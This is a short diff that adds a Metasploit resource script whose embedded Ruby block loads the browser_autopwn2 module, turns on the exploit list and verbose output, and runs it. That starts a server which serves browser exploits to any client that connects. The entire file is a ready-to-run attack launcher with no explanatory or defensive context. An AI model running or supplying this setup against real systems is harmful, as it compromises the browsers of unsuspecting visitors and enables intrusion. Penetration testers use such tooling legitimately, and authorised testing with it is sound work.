@@ -1,0 +1,6 @@
+<ruby>
+run_single("use auxiliary/server/browser_autopwn2")
+run_single("set ShowExploitList true")
+run_single("set VERBOSE true")
+run_single("run")
+</ruby>
